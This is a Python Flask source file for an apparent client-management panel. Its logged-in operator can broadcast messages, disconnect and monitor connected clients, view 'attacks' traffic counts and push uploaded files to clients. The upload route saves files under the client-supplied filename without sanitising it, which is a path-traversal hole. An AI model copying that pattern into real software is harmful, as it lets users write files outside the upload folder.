# @Time    : 2020/03/11
# @Author  : JOHNSON
# @FileName: client.py
# @Software: Pycharm
# @Blog    ：https://space.bilibili.com/274407612

# 操作 client 文件
import os
import threading

from main import app, UPLOAD_PATH
from flask import request, redirect
from module.Response import Resnponse
from module.Service import service
from module.Status import CodeRequestOkButNoChange, CodeRequestNo, StatusBadRequest, CodeRequestOk
from module.WriteLog import log
from main import socketio
from module.Authtication import check_login
from flask import jsonify
from module.Traffic import attacks_total


@app.route('/append_client', methods=["POST"])
def append_client() -> Resnponse:
    """
    将连接对象添加到发送对象列表中
    """
    if not check_login(): return redirect('/login')
    key = request.form.get('key')
    appended, msg = service.append_client_to_sendlist(key)
    if appended: return Resnponse.success(msg)
    return Resnponse.error(msg, CodeRequestOkButNoChange)

@app.route('/remove_client', methods=["POST"])
def remove_client() -> Resnponse:
    """
    将连接对象添加到发送对象列表中
    """
    if not check_login(): return redirect('/login')
    key = request.form.get('key')
    removed, msg = service.remove_client_from_sendlist(key)
    if removed: return Resnponse.success(msg)
    return Resnponse.error(msg, CodeRequestOkButNoChange)

# 获取接入的 Ip 地址和 Port 端口列表
@app.route('/send', methods=["POST"])
def send() -> Resnponse:
    if not check_login(): return redirect('/login')
    msg = request.form.get('msg')
    service.send(msg)
    log.write(msg + '\n', 'SYSTEM')
    return Resnponse.success(msg, type='SYSTEM')

@app.route('/disconnect_client', methods=['POST'])
def disconnect_client():
    if not check_login(): return redirect('/login')
    client_key = request.form.get('key')
    suc, msg = service.disconnect(client_key)
    if suc: return Resnponse.success(msg)
    return Resnponse.error(msg)

# 获取某个
@app.route('/get_traffic', methods=["GET"])
def get_traffic() -> jsonify:
    if not check_login(): return redirect('/login')
    data = {
        'message': "获取成功",
        "data": attacks_total.attacks,
        "type": "INFO",
        'code': CodeRequestOk
    }
    return jsonify(data)

# 获取某个
@app.route('/get_client_usage', methods=["POST"])
def get_client_usage() -> Resnponse:
    if not check_login(): return redirect('/login')
    client_key = request.form.get('client_key')
    if client_key:
        if service.client_monitor is None:
            try:
                service.client[client_key].send(b'[::usage]')
            except KeyError:
                return Resnponse.error('没有这个连接对象')
            service.client_monitor = client_key
            return Resnponse.success('打开客户端 {} 监控成功'.format(client_key), type='SYSTEM')
        return Resnponse.error('已有在监控的客户端了', code=CodeRequestOkButNoChange)
    return Resnponse.error('打开客户端监控失败')

@app.route('/stop_client_usage', methods=["POST"])
def stop_client_usage() -> Resnponse:
    if not check_login(): return redirect('/login')
    client_key = request.form.get('client_key')
    if client_key and service.client_monitor is not None:
        try:
            service.client[client_key].send(b'[::nusage]')
        except KeyError:
            service.client_monitor = None
            return Resnponse.error('没有这个连接对象')
        except ConnectionResetError:
            socketio.emit('server_response', {'action': 'on_disconected', 'key': client_key}, namespace='/channel')
            service.remove_client(client_key)
        service.client_monitor = None
        return Resnponse.success('关闭客户端 {} 监控成功'.format(client_key), type='SYSTEM')
    return Resnponse.error('打开客户端监控失败')


# 分发文件
@app.route('/send_file', methods=["POST"])
def send_file() -> Resnponse:
    # 验证登录
    if not check_login(): return redirect('/login')

    # 保存文件
    try:
        f = request.files['files']
        f.save(os.path.join(UPLOAD_PATH, f.filename))
    except Exception:
        return Resnponse.error("文件呢????", CodeRequestNo, StatusBadRequest)

    # 获取发送列表
    host_arr = request.form.get("host_arr")
    if not host_arr and not service.client:
        return Resnponse.error("没有连接对象,或没有选择连接对象", CodeRequestNo, StatusBadRequest)

    threading.Thread(target=service.send_file, args=(host_arr, f.filename)).start()

    return Resnponse.success("操作成功, 正在发送, 请耐心等待")